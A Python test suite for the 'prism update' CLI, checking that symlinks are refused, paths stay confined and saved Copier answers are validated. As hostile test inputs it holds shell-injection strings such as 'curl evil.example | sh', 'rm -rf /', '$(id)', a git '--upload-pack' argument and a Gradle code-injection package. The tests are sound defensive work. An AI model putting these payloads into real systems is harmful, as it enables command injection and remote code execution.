"""`prism update` never writes through a link and never runs Copier with trust against an answers file it has not checked.

Recopy writes the saved answers of a layer to a file beside its answers file and runs Copier on it. That file is
created exclusively, in a directory that is checked first, and every answers file the update reads or writes is
confined to the workspace: a symlink, a junction or any other reparse point on the path is refused.

The update also runs Copier with `--trust` against each app layer's own answers file, so a layer must come from the
workspace's approved template source and carry the identity the manifest and the workspace give it. The workspace
layer's own answers file is held to the same rule: it must select the workspace layer and hold only safe values, and
no link at its place is opened, stat-ed or followed.
"""

from __future__ import annotations

import builtins
import io
import os
import pathlib
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import yaml
from jinja2 import Environment, StrictUndefined

from prism_cli import app_cli, cli, wiki_paths
from prism_cli.packs import (
    layer_answers_problems,
    pack_answers,
    read_app_answers,
    workspace_answers_problems,
    workspace_apps_problems,
    workspace_data,
)
from prism_cli.manifest_update import ManifestUpdateError, prepare_manifest_update
from prism_cli.workspace import AnswersRefused, _read_answers, inspect_workspace, read_answers_bytes, write_workspace_manifest
from tests import real_temp  # noqa: F401
from tests.layered_support import commit_workspace, generate_workspace, git, read_yaml, run_cli, tag_template_change
from tests.test_layered_generation import API_TWO, BACKEND, PACK_AGENTS, WORKSPACE_DOCS, LayeredTestCase

VICTIM_TEXT = "the file of someone else\n"
REPO_ROOT = Path(__file__).resolve().parents[1]
PINS = yaml.safe_load((REPO_ROOT / "packs" / "versions.yml").read_text(encoding="utf-8"))
INJECTED_PACKAGE = 'com.example.audit"; println("review-injected"); //'


def link(target: Path, name: Path, *, directory: bool = False) -> None:
    try:
        os.symlink(target, name, target_is_directory=directory)
    except (OSError, NotImplementedError):
        raise unittest.SkipTest("symbolic links are not available on this machine")


class RecopyAnswersFileTests(unittest.TestCase):
    """`create_recopy_answers` and `confined_project_path`, on a disposable project folder."""

    def setUp(self) -> None:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.base = Path(temporary.name).resolve()
        self.project = self.base / "project"
        (self.project / "services" / "api-two").mkdir(parents=True)
        self.outside = self.base / "outside"
        self.outside.mkdir()
        self.victim = self.outside / "victim.txt"
        self.victim.write_text(VICTIM_TEXT, encoding="utf-8")

    def test_a_symlink_planted_at_the_old_predictable_name_is_not_written_through(self) -> None:
        for relative in (".copier-answers.prism-recopy.yml", "services/api-two/.copier-answers.prism-recopy.yml"):
            with self.subTest(relative=relative):
                planted = self.project / relative
                link(self.victim, planted)
                answers_file = relative.replace(".copier-answers.prism-recopy.yml", ".copier-answers.yml")
                created = cli.create_recopy_answers(self.project, answers_file, {"_src_path": "x", "app_id": "api-two"})
                self.assertEqual(VICTIM_TEXT, self.victim.read_text(encoding="utf-8"), "the planted link's target was not truncated or written")
                self.assertNotEqual(planted, created)
                self.assertFalse(created.is_symlink())
                self.assertEqual({"_src_path": "x", "app_id": "api-two"}, yaml.safe_load(created.read_text(encoding="utf-8")))
                self.assertEqual(planted.parent, created.parent)
                created.unlink()
                planted.unlink()

    def test_the_file_is_created_exclusively_with_a_name_nobody_can_predict(self) -> None:
        names = set()
        for _ in range(5):
            created = cli.create_recopy_answers(self.project, ".copier-answers.yml", {"a": 1})
            names.add(created.name)
            created.unlink()
        self.assertEqual(5, len(names))
        calls = []
        real = tempfile.mkstemp

        def spy(*args, **kwargs):
            calls.append(kwargs)
            return real(*args, **kwargs)

        with patch.object(cli.tempfile, "mkstemp", side_effect=spy):
            cli.create_recopy_answers(self.project, ".copier-answers.yml", {"a": 1}).unlink()
        self.assertEqual(1, len(calls), "mkstemp opens the file with O_CREAT | O_EXCL")

    def test_a_directory_link_on_the_path_is_refused_and_nothing_is_written_beyond_it(self) -> None:
        shutil.rmtree(self.project / "services")
        link(self.outside, self.project / "services", directory=True)
        before = sorted(path.name for path in self.outside.iterdir())
        with self.assertRaises(cli.UpdateSafetyError):
            cli.create_recopy_answers(self.project, "services/api-two/.copier-answers.yml", {"a": 1})
        self.assertEqual(before, sorted(path.name for path in self.outside.iterdir()))
        self.assertEqual(VICTIM_TEXT, self.victim.read_text(encoding="utf-8"))

    def test_an_answers_file_that_is_a_link_is_refused(self) -> None:
        link(self.victim, self.project / "services" / "api-two" / ".copier-answers.yml")
        with self.assertRaises(cli.UpdateSafetyError):
            cli.create_recopy_answers(self.project, "services/api-two/.copier-answers.yml", {"a": 1})
        with self.assertRaises(cli.UpdateSafetyError):
            cli.confined_project_path(self.project, "services/api-two/.copier-answers.yml")
        self.assertEqual(VICTIM_TEXT, self.victim.read_text(encoding="utf-8"))

    def test_an_answers_file_behind_a_link_is_not_read(self) -> None:
        (self.outside / "api-two").mkdir()
        (self.outside / "api-two" / ".copier-answers.yml").write_text("_src_path: https://evil.example/x.git\n", encoding="utf-8")
        shutil.rmtree(self.project / "services")
        link(self.outside, self.project / "services", directory=True)
        self.assertIsNone(read_app_answers(self.project, "services/api-two"))

    def test_a_path_that_leaves_the_project_is_refused(self) -> None:
        for relative in ("../outside/x.yml", "services/../../outside/x.yml", "/etc/x.yml", "C:/x.yml", "services\\x.yml"):
            with self.subTest(relative=relative), self.assertRaises(cli.UpdateSafetyError):
                cli.confined_project_path(self.project, relative)

    def test_the_final_copy_replaces_the_answers_file_and_never_follows_a_link_at_its_place(self) -> None:
        answers = self.project / "services" / "api-two" / ".copier-answers.yml"
        answers.write_text("old: 1\n", encoding="utf-8")
        temp = cli.create_recopy_answers(self.project, "services/api-two/.copier-answers.yml", {"new": 2})
        os.replace(temp, cli.confined_project_path(self.project, "services/api-two/.copier-answers.yml"))
        self.assertEqual({"new": 2}, yaml.safe_load(answers.read_text(encoding="utf-8")))


class RecopyThroughTheCliTests(LayeredTestCase):
    """A committed link at the old predictable name does not let `prism update --strategy recopy` write outside the workspace."""

    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.workspace = cls.root / "base"
        code, out, err = generate_workspace(cls.repo, cls.workspace, {"project_name": "Layered App", "apps": [BACKEND, API_TWO]}, cls.root)
        if code != 0:
            raise AssertionError(out + err)
        commit_workspace(cls.workspace)

    def test_a_planted_symlink_is_left_alone_by_a_recopy(self) -> None:
        ws = self.root / "planted"
        shutil.copytree(self.workspace, ws)
        victim = self.root / "victim.txt"
        victim.write_text(VICTIM_TEXT, encoding="utf-8")
        git(ws, "config", "core.symlinks", "true")
        for relative in (".copier-answers.prism-recopy.yml", "backend/.copier-answers.prism-recopy.yml", "services/api-two/.copier-answers.prism-recopy.yml"):
            link(victim, ws / relative)
            git(ws, "add", "-f", relative)
        git(ws, "commit", "-qm", "Plant links")
        if not (ws / "services" / "api-two" / ".copier-answers.prism-recopy.yml").is_symlink():
            self.skipTest("git did not keep the links in the working tree on this machine")

        code, out, err = run_cli("update", str(ws), "--strategy", "recopy", "--yes", "--trust-template")

        self.assertEqual(VICTIM_TEXT, victim.read_text(encoding="utf-8"), out + err)
        self.assertEqual(0, code, out + err)


class LayerTrustTests(LayeredTestCase):
    """Every layer must come from the approved source and carry what the manifest and the workspace give it."""

    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.workspace = cls.root / "base"
        code, out, err = generate_workspace(cls.repo, cls.workspace, {"project_name": "Layered App", "apps": [BACKEND, API_TWO]}, cls.root)
        if code != 0:
            raise AssertionError(out + err)
        commit_workspace(cls.workspace)
        tag_template_change(cls.repo, "v2.0.0", (PACK_AGENTS, "append", "\nTemplate v2 note for {{ app_id }}.\n"), (WORKSPACE_DOCS, "append", "\nTemplate v2 workspace note.\n"))

    def tampered(self, name: str, **changes: object) -> Path:
        ws = self.root / name
        shutil.copytree(self.workspace, ws)
        path = ws / "services" / "api-two" / ".copier-answers.yml"
        data = read_yaml(path)
        data.update(changes)
        path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
        git(ws, "commit", "-qam", "Tamper with the saved answers of an app")
        return ws

    def refused(self, ws: Path, expected: str) -> None:
        code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")
        self.assertEqual(3, code, out + err)
        self.assertIn(expected, err)
        self.assertEqual("main", git(ws, "symbolic-ref", "--short", "HEAD").stdout.strip(), "nothing changed: no branch, no Copier run")

    def test_an_app_layer_that_names_another_template_source_is_refused_before_copier_runs(self) -> None:
        ws = self.tampered("other-source", _src_path="https://evil.example/malicious-template.git")
        with patch.object(cli.subprocess, "run") as copier:
            layers, problems = cli.plan_update_layers(ws)
        self.assertEqual(["workspace", "backend"], [layer.name for layer in layers])
        self.assertTrue(any("evil.example" in problem and "approved source" in problem for problem in problems), problems)
        copier.assert_not_called()
        self.refused(ws, "approved source")

    def test_a_saved_revision_that_is_not_a_plain_name_is_refused(self) -> None:
        for revision in ("--upload-pack=touch /tmp/x", "v1.0.0; rm -rf /", "../x", ""):
            with self.subTest(revision=revision):
                ws = self.tampered("revision", _commit=revision)
                layers, problems = cli.plan_update_layers(ws)
                self.assertTrue(any("revision" in problem for problem in problems), problems)
                shutil.rmtree(ws, onerror=lambda func, path, _exc: (os.chmod(path, 0o700), func(path)))

    def test_a_derived_value_that_disagrees_with_the_manifest_or_the_workspace_is_refused(self) -> None:
        for key, value in {
            "app_id": "backend",
            "app_path": "../../escape",
            "prism_layer": "nextjs-web",
            "app_package": "com.evil.pkg",
            "app_module_name": "Evil",
            "package_identifier": "com.evil",
            "project_slug": "evil",
        }.items():
            with self.subTest(key=key):
                ws = self.tampered(f"derived-{key}", **{key: value})
                _layers, problems = cli.plan_update_layers(ws)
                self.assertTrue(any(f"`{key}" in problem for problem in problems), problems)
                shutil.rmtree(ws, onerror=lambda func, path, _exc: (os.chmod(path, 0o700), func(path)))

    def test_a_name_or_an_audience_that_is_not_safe_to_render_is_refused(self) -> None:
        for key, value in {"app_name": "x'; rm -rf /", "audience": "a\nb"}.items():
            with self.subTest(key=key):
                ws = self.tampered(f"unsafe-{key}", **{key: value})
                _layers, problems = cli.plan_update_layers(ws)
                self.assertTrue(any(f"`{key}`" in problem and "safe to render" in problem for problem in problems), problems)
                shutil.rmtree(ws, onerror=lambda func, path, _exc: (os.chmod(path, 0o700), func(path)))

    def test_an_untampered_workspace_updates(self) -> None:
        ws = self.root / "untampered"
        shutil.copytree(self.workspace, ws)
        layers, problems = cli.plan_update_layers(ws)
        self.assertEqual([], problems)
        self.assertEqual(["workspace", "backend", "api-two"], [layer.name for layer in layers])

    def test_the_pure_check_accepts_what_the_cli_wrote(self) -> None:
        workspace_answers = read_yaml(self.workspace / ".copier-answers.yml")
        recorded = read_yaml(self.workspace / "services" / "api-two" / ".copier-answers.yml")
        app = {"id": "api-two", "name": recorded["app_name"], "stack": "spring-backend", "path": "services/api-two", "audience": recorded["audience"]}
        self.assertEqual([], layer_answers_problems(recorded, workspace_answers, app, approved_source=workspace_answers["_src_path"]))


class CopierSpy:
    """Fail the test the moment anything starts Copier; every other subprocess (git) runs for real."""

    def __init__(self) -> None:
        self.calls: list[list[str]] = []
        self._real = subprocess.run

    def __call__(self, command, *args, **kwargs):
        if isinstance(command, (list, tuple)) and "copier" in command:
            self.calls.append([str(item) for item in command])
            raise AssertionError(f"Copier must not run: {command}")
        return self._real(command, *args, **kwargs)


class WorkspaceAnswersTrustTests(LayeredTestCase):
    """The workspace layer's own answers file is validated like every app layer's, before any Copier call."""

    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.workspace = cls.root / "base"
        code, out, err = generate_workspace(cls.repo, cls.workspace, {"project_name": "Layered App", "apps": [BACKEND, API_TWO]}, cls.root)
        if code != 0:
            raise AssertionError(out + err)
        commit_workspace(cls.workspace)

    def tampered(self, name: str, **changes: object) -> Path:
        ws = self.root / name
        shutil.copytree(self.workspace, ws)
        path = ws / ".copier-answers.yml"
        data = read_yaml(path)
        data.update(changes)
        path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
        git(ws, "commit", "-qam", "Tamper with the saved answers of the workspace layer")
        return ws

    def hostile_apps(self, **changes: object) -> list[dict]:
        apps = read_yaml(self.workspace / ".copier-answers.yml")["apps"]
        return [{**apps[0], **changes}, *apps[1:]]

    def assert_refused(self, ws: Path, expected: str) -> None:
        """Both update strategies refuse with exit 3, name the problem, start no Copier and leave the branch alone."""

        copier = CopierSpy()
        with patch.object(subprocess, "run", copier):
            for strategy in ("update", "recopy"):
                code, out, err = run_cli("update", str(ws), "--strategy", strategy, "--yes", "--trust-template")
                self.assertEqual(cli.EXIT_VALIDATION, code, out + err)
                self.assertIn(expected, err)
                self.assertEqual("main", git(ws, "symbolic-ref", "--short", "HEAD").stdout.strip(), "nothing changed: no branch, no commit")
        self.assertEqual([], copier.calls)

    def test_a_root_file_that_selects_another_layer_with_an_injected_package_is_refused_before_copier_runs(self) -> None:
        ws = self.tampered(
            "other-layer",
            prism_layer="android-compose",
            app_id="audit",
            app_path="audit-app",
            app_package=INJECTED_PACKAGE,
            app_package_path="com/example/audit",
        )
        copier = CopierSpy()
        with patch.object(subprocess, "run", copier):
            layers, problems = cli.plan_update_layers(ws)
        self.assertEqual(["workspace"], [layer.name for layer in layers], "no app layer is planned")
        self.assertTrue(any("selects the layer `android-compose`" in problem and "must select `workspace`" in problem for problem in problems), problems)
        self.assertTrue(any("`app_package`" in problem and "does not ask" in problem for problem in problems), problems)
        self.assertEqual([], copier.calls)
        self.assert_refused(ws, "selects the layer `android-compose`")

    def test_an_answer_that_only_an_app_layer_asks_is_refused_even_when_the_layer_is_the_workspace(self) -> None:
        ws = self.tampered("derived-key", app_package=INJECTED_PACKAGE)
        self.assert_refused(ws, "does not ask")

    def test_a_hostile_app_entry_is_refused_before_it_reaches_a_taskfile_or_a_skill(self) -> None:
        for label, changes, expected in (
            ("name", {"name": 'x"; curl evil.example | sh #'}, "`name` that is not safe to render"),
            ("path", {"path": "apps/$(id)"}, "`path` that is not safe to render"),
            ("path escape", {"path": "../escape"}, "`path` that is not safe to render"),
            ("audience", {"audience": "a\nb"}, "`audience` that is not safe to render"),
            ("id", {"id": "x; rm -rf /"}, "needs an `id` that is a slug"),
            ("stack", {"stack": "evil-stack"}, "has no pack"),
            ("port", {"port": "8080; id"}, "not a port number"),
        ):
            with self.subTest(label=label):
                ws = self.tampered(f"app-{label.replace(' ', '-')}", apps=self.hostile_apps(**changes))
                _layers, problems = cli.plan_update_layers(ws)
                self.assertTrue(any(expected in problem for problem in problems), problems)
                self.assert_refused(ws, expected)

    def test_an_app_list_with_an_unknown_key_a_repeated_id_or_stacks_that_disagree_is_refused(self) -> None:
        apps = self.hostile_apps()
        for label, changes, expected in (
            ("unknown key", {"apps": [{**apps[0], "command": "curl evil.example | sh"}, *apps[1:]]}, "unknown command"),
            ("missing key", {"apps": [{key: value for key, value in apps[0].items() if key != "port"}, *apps[1:]]}, "missing port"),
            ("repeated id", {"apps": [apps[0], {**apps[1], "id": apps[0]["id"]}]}, "app ID twice"),
            ("stacks", {"stacks": ["spring-backend", "nextjs-web"]}, "but its apps give"),
            ("not a list", {"apps": "backend"}, "must be a list of apps"),
        ):
            with self.subTest(label=label):
                ws = self.tampered(f"list-{label.replace(' ', '-')}", **changes)
                _layers, problems = cli.plan_update_layers(ws)
                self.assertTrue(any(expected in problem for problem in problems), problems)

    def test_an_identity_that_is_not_safe_to_render_is_refused(self) -> None:
        saved = read_yaml(self.workspace / ".copier-answers.yml")
        for key, value, expected in (
            ("project_name", "x'; rm -rf /", "`project_name` that is not safe to render"),
            ("project_slug", "Evil Slug", "`project_slug`"),
            ("package_identifier", 'com.example"; println("x"); //', "`package_identifier`"),
            ("package_identifier", "com.example.class", "`package_identifier`"),
            ("description", 'say "hi" $(id)', "`description` that is not safe to render"),
        ):
            with self.subTest(key=key, value=value):
                problems = workspace_answers_problems({**saved, key: value})
                self.assertTrue(any(expected in problem for problem in problems), problems)
        ws = self.tampered("identity", project_name="x'; rm -rf /")
        self.assert_refused(ws, "`project_name` that is not safe to render")

    def test_the_template_source_and_revision_of_the_root_file_follow_the_same_trust_rule_as_an_app_layer(self) -> None:
        saved = read_yaml(self.workspace / ".copier-answers.yml")
        source = "template source that is not a plain path or URL"
        revision = "template revision that is not a plain tag or commit name"
        for key, value, expected in (
            ("_src_path", "--upload-pack=touch /tmp/x", source),
            ("_src_path", "", source),
            ("_src_path", "https://example.test/t.git\nx", source),
            ("_src_path", None, source),
            ("_commit", "--upload-pack=touch /tmp/x", revision),
            ("_commit", "v1.0.0; rm -rf /", revision),
            ("_commit", "", revision),
        ):
            with self.subTest(key=key, value=value):
                problems = workspace_answers_problems({**saved, key: value})
                self.assertTrue(any(expected in problem for problem in problems), problems)

    def test_the_manifest_apps_the_update_hands_to_copier_are_validated_too(self) -> None:
        apps = [{"id": "backend", "name": "Backend", "stack": "spring-backend", "path": "backend", "audience": "", "port": 8080}]
        self.assertEqual([], workspace_apps_problems(["spring-backend"], apps))
        for changes in ({"name": "$(id)"}, {"path": "a b"}, {"audience": "`id`"}):
            with self.subTest(changes=changes):
                self.assertTrue(workspace_apps_problems(["spring-backend"], [{**apps[0], **changes}]))

    def test_scaffolding_an_app_refuses_a_tampered_root_file_before_it_runs_copier(self) -> None:
        ws = self.tampered("scaffold-tampered", prism_layer="android-compose", app_package=INJECTED_PACKAGE)
        arguments = ("app", "add", "api-three", "--stack", "spring-backend", "--path", "services/api-three", "--scaffold", str(ws))
        copier = CopierSpy()
        with patch.object(subprocess, "run", copier):
            code, out, err = run_cli(*arguments, "--apply", "--yes", "--trust-template")
            _preview_code, preview_out, preview_err = run_cli(*arguments)
        self.assertNotEqual(0, code, out + err)
        self.assertIn("selects the layer `android-compose`", out + err)
        self.assertIn("selects the layer `android-compose`", preview_out + preview_err)
        self.assertEqual([], copier.calls)
        self.assertFalse((ws / "services" / "api-three").exists())
        self.assertEqual("main", git(ws, "symbolic-ref", "--short", "HEAD").stdout.strip())

    def test_an_untampered_root_file_is_accepted_and_the_update_plans_every_layer(self) -> None:
        saved = read_yaml(self.workspace / ".copier-answers.yml")
        self.assertEqual([], workspace_answers_problems(saved))
        self.assertEqual([], workspace_answers_problems({key: value for key, value in saved.items() if key != "prism_layer"}), "the workspace layer is the default when it is absent")
        layers, problems = cli.plan_update_layers(self.workspace)
        self.assertEqual([], problems)
        self.assertEqual(["workspace", "backend", "api-two"], [layer.name for layer in layers])

    def test_every_answer_the_golden_workspace_saves_passes(self) -> None:
        golden = read_yaml(REPO_ROOT / "golden" / ".copier-answers.yml")
        self.assertEqual([], workspace_answers_problems(golden))

    def test_an_app_layer_that_records_an_answer_no_app_layer_asks_is_refused(self) -> None:
        workspace_answers = read_yaml(self.workspace / ".copier-answers.yml")
        recorded = read_yaml(self.workspace / "services" / "api-two" / ".copier-answers.yml")
        app = {"id": "api-two", "name": recorded["app_name"], "stack": "spring-backend", "path": "services/api-two", "audience": recorded["audience"]}
        source = workspace_answers["_src_path"]
        self.assertEqual([], layer_answers_problems(recorded, workspace_answers, app, approved_source=source))
        problems = layer_answers_problems({**recorded, "versions": {"jdk": "evil"}}, workspace_answers, app, approved_source=source)
        self.assertTrue(any("no app layer asks" in problem and "`versions`" in problem for problem in problems), problems)


def render(path: Path, context: dict) -> str:
    environment = Environment(undefined=StrictUndefined, keep_trailing_newline=True, autoescape=False)
    return environment.from_string(path.read_text(encoding="utf-8")).render(**context)


class RenderedFromValidatedValuesTests(unittest.TestCase):
    """The Android Gradle file and the root Taskfile take their values from validated data, never from a saved file as it is."""

    project = {"project_name": "Audit", "project_slug": "audit", "package_identifier": "com.example.audit"}
    source = "https://example.test/t.git"
    gradle = REPO_ROOT / "packs" / "android-compose" / "{{ app_path }}" / "app" / "build.gradle.kts.jinja"
    taskfile = REPO_ROOT / "template" / "Taskfile.yml.jinja"
    android = {"id": "mobile-android", "name": "Android App", "stack": "android-compose", "path": "mobile-android", "audience": "", "generation": "scaffolded"}

    def android_context(self, **overrides: object) -> dict:
        return {**pack_answers(self.project, self.android, port=0), "versions": PINS["android-compose"], **overrides}

    def test_the_gradle_namespace_comes_from_the_package_derived_from_the_validated_project_and_app_id(self) -> None:
        text = render(self.gradle, self.android_context())
        self.assertIn('namespace = "com.example.audit.mobileandroid"', text)
        self.assertNotIn("review-injected", text)

    def test_a_tampered_package_would_write_code_into_the_gradle_file_and_is_what_the_validation_refuses(self) -> None:
        # The control: the same template, given the value an unvalidated saved file could carry, writes code.
        self.assertIn('println("review-injected")', render(self.gradle, self.android_context(app_package=INJECTED_PACKAGE)))
        root = {"_src_path": self.source, **self.project, "prism_layer": "android-compose", "app_package": INJECTED_PACKAGE, "stacks": [], "apps": []}
        self.assertTrue(any("`app_package`" in problem for problem in workspace_answers_problems(root)))
        recorded = {**self.android_context(), "_src_path": self.source, "app_package": INJECTED_PACKAGE}
        problems = layer_answers_problems(recorded, {**self.project, "_src_path": self.source}, self.android, approved_source=self.source)
        self.assertTrue(any("`app_package" in problem for problem in problems), problems)

    def test_the_taskfile_is_rendered_from_the_validated_app_list_only(self) -> None:
        apps = [{"id": "backend", "name": "Backend", "stack": "spring-backend", "path": "backend", "audience": "", "generation": "scaffolded"}]
        data = workspace_data(self.project, apps, {"backend": 8080})
        self.assertEqual([], workspace_apps_problems(data["stacks"], data["apps"]))
        context = {**self.project, "pack_versions": PINS, "description": "A project", **data}
        rendered = yaml.safe_load(render(self.taskfile, context))
        self.assertEqual("./backend/Taskfile.yml", rendered["includes"]["backend"]["taskfile"])
        hostile = [{**data["apps"][0], "id": "x\n  evil: {taskfile: ./evil}", "path": "apps/$(id)"}]
        self.assertTrue(workspace_apps_problems(data["stacks"], hostile), "the hostile entry that would render into the Taskfile is refused before rendering")


class RootAnswersLinkTests(unittest.TestCase):
    """A link planted at the place of the root answers file is refused before anything opens, stats or follows it."""

    def setUp(self) -> None:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.base = Path(temporary.name).resolve()
        self.project = self.base / "project"
        self.project.mkdir()
        self.outside = self.base / "outside-share"
        self.outside.mkdir()
        self.target = self.outside / "answers.yml"
        self.target.write_text("_src_path: https://evil.example/malicious-template.git\n", encoding="utf-8")
        self.link = self.project / ".copier-answers.yml"
        link(self.target, self.link)
        self.touched: list[str] = []

    def spies(self) -> list:
        """Patches that record every call that could follow the link: an open, a stat or a read naming the link or the outside folder."""

        outside = os.path.normcase(str(self.outside))
        link_name = os.path.normcase(str(self.link))

        def note(name: object) -> None:
            if isinstance(name, (str, os.PathLike)):
                text = os.path.normcase(os.fspath(name))
                if text == link_name or text.startswith(outside):
                    self.touched.append(text)

        patches = []
        for owner, attribute in ((builtins, "open"), (io, "open"), (os, "stat")):
            original = getattr(owner, attribute)

            def wrapper(name, *args, real=original, **kwargs):
                if kwargs.get("follow_symlinks", True):  # `lstat` is `stat(follow_symlinks=False)`: it asks about the link itself
                    note(name)
                return real(name, *args, **kwargs)

            patches.append(patch.object(owner, attribute, wrapper))
        for attribute in ("open", "read_text", "read_bytes", "stat", "exists", "is_file", "resolve"):
            original = getattr(pathlib.Path, attribute)

            def method(path, *args, real=original, **kwargs):
                if kwargs.get("follow_symlinks", True):
                    note(path)
                return real(path, *args, **kwargs)

            patches.append(patch.object(pathlib.Path, attribute, method))
        return patches

    def run_spied(self, function, *arguments):
        patches = self.spies()
        for item in patches:
            item.start()
        try:
            return function(*arguments)
        finally:
            for item in reversed(patches):
                item.stop()

    def test_load_copier_answers_refuses_the_link_and_names_the_way_out_without_touching_it(self) -> None:
        with self.assertRaises(cli.UpdateSafetyError) as raised:
            self.run_spied(cli.load_copier_answers, self.link)
        self.assertEqual([], self.touched, "no open or stat named the link or the outside file")
        message = str(raised.exception)
        self.assertIn(".copier-answers.yml", message)
        self.assertIn("symlink", message)
        self.assertIn("restore it from git", message)

    def test_the_inspection_refuses_the_link_with_an_error_diagnostic_and_reads_nothing(self) -> None:
        data, present, diagnostics = self.run_spied(_read_answers, self.link)
        self.assertEqual([], self.touched)
        self.assertEqual(({}, True), (data, present))
        self.assertEqual(["unsafe-copier-answers"], [item.code for item in diagnostics])
        self.assertEqual("error", diagnostics[0].severity)
        self.assertIn("restore it from git", diagnostics[0].message)

    def test_a_workspace_inspection_reports_the_link_and_never_opens_the_outside_file(self) -> None:
        (self.project / "prism.workspace.yml").write_text(
            yaml.safe_dump({"schema_version": 2, "project": {"name": "P", "slug": "p"}, "apps": []}, sort_keys=False), encoding="utf-8"
        )
        inspection = self.run_spied(inspect_workspace, self.project)
        self.assertEqual([], [item for item in self.touched if item.startswith(os.path.normcase(str(self.outside)))])
        self.assertEqual([], [item for item in self.touched if item == os.path.normcase(str(self.link))], "the link itself was not opened or stat-ed")
        self.assertIn("unsafe-copier-answers", [item.code for item in inspection.diagnostics])
        self.assertEqual({}, inspection.answers)

    def test_the_manifest_preparation_of_an_update_does_not_copy_the_file_behind_the_link(self) -> None:
        write_workspace_manifest(
            self.project,
            {"project_name": "P", "project_slug": "p", "package_identifier": "com.example.p"},
            prism_cli_version="0.5.0",
            template_source="https://example.test/t.git",
            template_version="v1.0.0",
            template_commit="abc123",
        )
        with self.assertRaises(ManifestUpdateError) as raised:
            self.run_spied(prepare_manifest_update, self.project, "v1.0.0")
        self.assertEqual([], self.touched, "the link was neither copied nor stat-ed")
        self.assertIn("symlink", str(raised.exception))
        self.assertIn("restore it from git", str(raised.exception))

    def test_a_regular_file_and_a_missing_file_behave_as_before(self) -> None:
        self.link.unlink()
        self.assertIsNone(cli.load_copier_answers(self.link))
        self.assertEqual(({}, False, []), _read_answers(self.link))
        self.link.write_text("_src_path: https://example.test/t.git\n", encoding="utf-8")
        self.assertEqual({"_src_path": "https://example.test/t.git"}, cli.load_copier_answers(self.link))
        self.assertEqual("https://example.test/t.git", _read_answers(self.link)[0]["_src_path"])

    def test_the_write_after_a_generation_never_goes_through_the_link(self) -> None:
        with self.assertRaises(cli.UpdateSafetyError):
            cli.ensure_copier_answers_file(self.project, "https://example.test/t.git", {"project_name": "P"})
        self.assertEqual("_src_path: https://evil.example/malicious-template.git\n", self.target.read_text(encoding="utf-8"))


class RootAnswersLinkThroughTheCliTests(LayeredTestCase):
    """`prism update` on a workspace whose committed root answers file is a link stops with the way out and follows nothing."""

    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.workspace = cls.root / "base"
        code, out, err = generate_workspace(cls.repo, cls.workspace, {"project_name": "Layered App", "apps": [BACKEND]}, cls.root)
        if code != 0:
            raise AssertionError(out + err)
        commit_workspace(cls.workspace)

    def test_a_planted_root_link_is_refused_and_copier_never_runs(self) -> None:
        ws = self.root / "linked"
        shutil.copytree(self.workspace, ws)
        outside = self.root / "outside-answers.yml"
        shutil.copyfile(ws / ".copier-answers.yml", outside)
        git(ws, "config", "core.symlinks", "true")
        (ws / ".copier-answers.yml").unlink()
        link(outside, ws / ".copier-answers.yml")
        git(ws, "add", "-A")
        git(ws, "commit", "-qm", "Replace the root answers file with a link")
        if not (ws / ".copier-answers.yml").is_symlink():
            self.skipTest("git did not keep the link in the working tree on this machine")
        before = outside.read_bytes()

        copier = CopierSpy()
        with patch.object(subprocess, "run", copier):
            code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")

        self.assertEqual(cli.EXIT_VALIDATION, code, out + err)
        self.assertIn("symlink", err)
        self.assertIn("restore it from git", err)
        self.assertEqual([], copier.calls)
        self.assertEqual(before, outside.read_bytes(), "the file behind the link was not written")
        self.assertEqual("main", git(ws, "symbolic-ref", "--short", "HEAD").stdout.strip())


class CopierRecorder:
    """Stand in for `subprocess.run`: note every Copier command and the answers file it is given, then run it (or ``fake`` it).

    ``before(record)`` runs when a Copier command starts and ``after(record)`` when it is done; every other subprocess (git) runs for real.
    A record holds the ``--answers-file`` argument and what that file held (parsed) when Copier started.
    """

    def __init__(self, project: Path, *, before=None, after=None, fake=None) -> None:
        self.project = project
        self.before, self.after, self.fake = before, after, fake
        self.calls: list[dict] = []
        self._real = subprocess.run

    def __call__(self, command, *args, **kwargs):
        if not (isinstance(command, (list, tuple)) and "copier" in command and "--answers-file" in command):
            return self._real(command, *args, **kwargs)
        relative = str(command[list(command).index("--answers-file") + 1])
        path = self.project / relative
        record = {"command": [str(item) for item in command], "answers_file": relative, "content": yaml.safe_load(path.read_bytes()) if path.is_file() else None}
        self.calls.append(record)
        if self.before is not None:
            self.before(record)
        completed = self.fake(command) if self.fake is not None else self._real(command, *args, **kwargs)
        if self.after is not None:
            self.after(record)
        return completed


class AnswersSnapshotTests(LayeredTestCase):
    """Validation and use are one operation on one snapshot: Copier is given the validated answers, and a file that changed is never consumed."""

    LAYER_FILES = (".copier-answers.yml", "backend/.copier-answers.yml", "services/api-two/.copier-answers.yml")

    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.workspace = cls.root / "base"
        code, out, err = generate_workspace(cls.repo, cls.workspace, {"project_name": "Layered App", "apps": [BACKEND, API_TWO]}, cls.root)
        if code != 0:
            raise AssertionError(out + err)
        commit_workspace(cls.workspace)
        tag_template_change(cls.repo, "v2.0.0", (PACK_AGENTS, "append", "\nTemplate v2 note for {{ app_id }}.\n"))

    def copy_workspace(self, name: str) -> Path:
        ws = self.root / name
        shutil.copytree(self.workspace, ws)
        return ws

    @staticmethod
    def hostile(ws: Path, relative: str = ".copier-answers.yml") -> bytes:
        """Replace an answers file with one that carries a package no layer may record, as a changed file in a merge would."""

        path = ws / relative
        data = read_yaml(path)
        data["app_package"] = INJECTED_PACKAGE
        path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
        return path.read_bytes()

    def assert_nothing_started(self, ws: Path, code: int, err: str, relative: str) -> None:
        self.assertNotEqual(0, code, err)
        self.assertIn(f"`{relative}` changed after Prism read and validated it", err)
        self.assertIn("run the command again", err)
